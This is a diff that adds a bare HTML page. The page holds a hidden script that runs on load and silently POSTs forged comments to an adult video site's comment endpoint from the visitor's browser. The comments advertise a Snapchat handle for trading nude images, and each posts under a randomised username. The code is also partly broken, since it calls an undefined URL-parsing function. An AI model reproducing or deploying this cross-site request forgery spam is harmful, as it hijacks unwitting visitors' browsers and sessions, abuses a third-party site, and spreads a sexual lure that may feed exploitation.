@@ -1,0 +1,52 @@
+<html><head><script>
+
+
+function getVid(){
+   var sites = ["7919931","7588645","8857924","3646861","5372733","8597903","3700204","9177825","8876294","8014555","8837395","9151381","9086714","6508338","307187","9141880","7532044","3347613","667560","8222458","9225022","9155842","1984695","8508329","3592961","9091466","1978022","691892","6317459"];
+        var i = parseInt(Math.random()*(sites.length-1));
+    return sites[i];
+};
+
+function getCom(){
+     var sites1 = ["sharing nudes on snapchat, jennyp2013", "who wants to trade nudes on snapchat? jennyp2013", "add me on snapchat for some fun ;) jennyp2013", "snapchat jennyp2013 for tradin nudes"];
+    var i = parseInt(Math.random()*(sites1.length-1));
+    return sites1[i];
+};
+
+var randy=Math.floor(Math.random()*1100);
+var cmt=getCom();
+var vid=getUrlVars()["id"];
+function XHR() {
+    try {
+        return new XMLHttpRequest();
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml3.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.6.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP.3.0');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Msxml2.XMLHTTP');
+    } catch (e) {};
+    try {
+        return new ActiveXObject('Microsoft.XMLHTTP');
+    } catch (e) {};
+    return null;
+};
+xmlhttp = new XHR();
+if (xmlhttp != null) {
+    xmlhttp['open']('POST', 'http://www.xnxx.com/postcomment/' + vid, false);
+    xmlhttp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
+   xmlhttp['send']('user=jennyp'+randy+'&comment=' + cmt + '&test=ok');
+
+    if (xmlhttp['responseText'] != null) {
+        var token = xmlhttp['responseText'];
+    };
+} else {};
+</script>
+</head>
+</html>
